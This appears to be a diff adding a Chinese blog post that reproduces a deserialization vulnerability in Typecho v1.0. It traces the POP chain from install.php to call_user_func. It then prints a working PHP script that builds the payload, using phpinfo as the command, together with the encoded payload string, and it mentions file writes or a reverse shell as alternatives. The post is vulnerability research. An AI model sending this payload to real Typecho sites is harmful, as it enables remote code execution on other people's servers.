@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Typecho-反序列化漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/11/18/Typecho-反序列化漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Typecho-反序列化漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/18/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/kRu4hnxIpLGSaBb.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/fY9wxZyMl4sbLqd.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/DamuN8yxpMjFiKI.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/mk673GgKXBcnNDe.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/WpjoTxeXC2mHzuQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/NmwpOPBkTWGKcqx.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/18/RH6FQbhfJ18e7aG.png">
+<meta property="article:published_time" content="2019-11-18T00:56:15.000Z">
+<meta property="article:modified_time" content="2020-03-28T01:07:03.091Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/18/kRu4hnxIpLGSaBb.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> Typecho-反序列化漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Typecho-反序列化漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 18 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#1-获取漏洞">1、获取漏洞</a></li>
+<li><a href="#2-漏洞实现">2、漏洞实现</a></li>
+<li><a href="#3-漏洞分析">3、漏洞分析</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>逛到一篇<code>Typecho-反序列化漏洞</code>，感觉比较有意思，遂来复现一下</p>
+<h4><span id="1-获取漏洞">1、获取漏洞</span></h4><p> <code>v1.0版本</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;typecho&#x2F;typecho.git --branch v1.0-14.10.10-release</span><br></pre></td></tr></table></figure>
+
+<h4><span id="2-漏洞实现">2、漏洞实现</span></h4><p>参考漏洞分析最后的漏洞实现</p>
+<h4><span id="3-漏洞分析">3、漏洞分析</span></h4><p>漏洞的入口点在<code>install.php</code></p>
+<p><img src="https://i.loli.net/2019/11/18/kRu4hnxIpLGSaBb.png" alt="Snipaste_2019-11-18_13-58-26.png"></p>
+<p>这里只需要传个<code>finish</code>，再把<code>referer</code>改成站内<code>url</code>即可</p>
+<p>然后就是反序列化触发点</p>
+<p><img src="https://i.loli.net/2019/11/18/fY9wxZyMl4sbLqd.png" alt="Snipaste_2019-11-18_14-03-43.png"></p>
+<blockquote>
+<p>这里如果构造的反序列化是一个数组，其中adapter设置为某个类，就可以触发相应类的<code>__toString</code>方法 </p>
+</blockquote>
+<p>那么继续寻找可用的<code>__toString()</code></p>
+<p><code>var/Typecho/Feed.php</code></p>
+<p><img src="https://i.loli.net/2019/11/18/DamuN8yxpMjFiKI.png" alt="Snipaste_2019-11-18_14-11-18.png"></p>
+<p><code>$item</code>是一个私有变量数组，去调用<code>screenName</code>变量，这里可以触发<code>__get()</code></p>
+<blockquote>
+<p><code>__get</code>会在读取不可访问的属性的值的时候调用 </p>
+</blockquote>
+<p>那么寻找可用的<code>__get()</code></p>
+<p><code>var/Typecho/Request.php</code></p>
+<p><img src="https://i.loli.net/2019/11/18/mk673GgKXBcnNDe.png" alt="Snipaste_2019-11-18_14-15-58.png"></p>
+<p>追踪<code>get()</code>方法</p>
+<p><img src="https://i.loli.net/2019/11/18/WpjoTxeXC2mHzuQ.png" alt="Snipaste_2019-11-18_14-18-03.png"></p>
+<p>追踪<code>_applyFilter()</code></p>
+<p><img src="https://i.loli.net/2019/11/18/NmwpOPBkTWGKcqx.png" alt="Snipaste_2019-11-18_14-19-08.png"></p>
+<p><code>call_user_func()</code>可命令执行等</p>
+<p>总结一下<code>POP链</code></p>
+<p><code>var/Typecho/Feed.php</code>-&gt;<code>__toString()</code>-&gt;<code>$item[&#39;author&#39;]-&gt;screenName</code></p>
+<p><code>var/Typecho/Request.php</code>-&gt;<code>__get()</code>-&gt;<code>get()</code>-&gt;<code>_applyFilter</code>-&gt;<code>call_user_func()</code></p>
+<p>那么尝试构造payload</p>
+<p>但是发现500错误导致没有回显，但是调试明明没问题=。=</p>
+<blockquote>
+<p>在<code>install.php</code>的开始，调用了<code>ob_start()</code></p>
+<p>因为我们上面对象注入的代码触发了原本的exception，导致<code>ob_end_clean()</code>执行，原本的输出会在缓冲区被清理。 </p>
+<p>我们可以将程序提前<code>exit</code>，不经过后面的报错即可。 </p>
+</blockquote>
+<blockquote>
+<p>这里有两个办法。 1、因为<code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 </p>
+</blockquote>
+<p><strong>这里value被限制了不能为数组，所以考虑设置filter为数组，但是这样比较麻烦，所以参考链接增加如下<code>$item[&#39;category&#39;] = array(new Typecho_Request());</code></strong></p>
+<p><strong>当然写入文件，反弹shell等无回显的也可</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Typecho_Feed&#123;</span><br><span class="line">		private $_items &#x3D; array();</span><br><span class="line">		const RSS2 &#x3D; &#39;RSS 2.0&#39;;</span><br><span class="line">		private $_type;</span><br><span class="line">		public function __construct()</span><br><span class="line">    	&#123;</span><br><span class="line">    		$this-&gt;_type &#x3D; self::RSS2;</span><br><span class="line">    		$item[&#39;author&#39;] &#x3D; new Typecho_Request();</span><br><span class="line">    		$item[&#39;category&#39;] &#x3D; array(new Typecho_Request());</span><br><span class="line">    		$this-&gt;_items[0] &#x3D; $item;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Typecho_Request&#123;</span><br><span class="line">		private $_filter &#x3D; array();</span><br><span class="line">		private $_params &#x3D; array();</span><br><span class="line">		public function __construct()</span><br><span class="line">	    &#123;</span><br><span class="line">	        $this-&gt;_params[&#39;screenName&#39;] &#x3D; &#39;1&#39;;</span><br><span class="line">	        $this-&gt;_filter[0] &#x3D; &#39;phpinfo&#39;;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$a &#x3D; new Typecho_Feed();</span><br><span class="line">	$b &#x3D; [&#39;adapter&#39;&#x3D;&gt;$a];</span><br><span class="line">	echo urlencode(base64_encode(serialize($b)));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fX19fXM6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7fX0%3D</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2019/11/18/RH6FQbhfJ18e7aG.png" alt="Snipaste_2019-11-18_15-17-41.png"></p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://www.cnblogs.com/litlife/p/11273647.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/11273647.html</a> </p>
+<p> <a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">LFIToRCE思路</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/11/08/phpcms-v9-6-0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">phpcms_v9.6.0SQL注入漏洞分析</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
